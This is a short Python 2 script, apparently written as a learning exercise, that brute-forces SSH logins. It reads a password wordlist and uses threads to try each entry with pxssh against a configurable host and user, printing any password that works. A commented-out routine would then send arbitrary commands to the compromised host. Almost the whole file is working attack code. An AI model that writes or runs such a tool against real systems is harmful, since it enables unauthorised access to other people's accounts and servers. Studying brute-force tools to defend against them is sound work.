#!/usr/bin/python

import pxssh,optparse  # pxssh module makes ssh connection process easier
from sys import exit
from threading import Thread

def send_commands(s):
        while True:
                command = raw_input("Enter the command you want to execute: ")
                s.sendline(command)
                s.prompt()  # Tries and match the prompt
                print s.before  # print texts before prmopt

def connect(hostname,username,password):
        s = pxssh.pxssh()  # Creating a pxssh object
        try:
                s.login(hostname,username,password)
                print '[+]Password found: ',password
                # send_command(s)  # YOU CALL THIS IF AFTER COMPLETITION OF ATTACK YOU WANT TO CONTINUE SENDING ATTACK
        except:
                return
def main():
        parser = optparse.OptionParser("USAGE: -f <pasword-file>")
        parser.add_option('-f',type = 'string',dest = 'file',help = 'specify file name')
        (options,args) = parser.parse_args()
        file = open(options.file,'r')
        for word in file.readlines():
                password = word.strip('\n')
                t = Thread(target=connect,args = ('localhost','nishan',password))  # first two arguments are hostname and username, change according to need
                t.start()

if __name__ == '__main__':
        main()

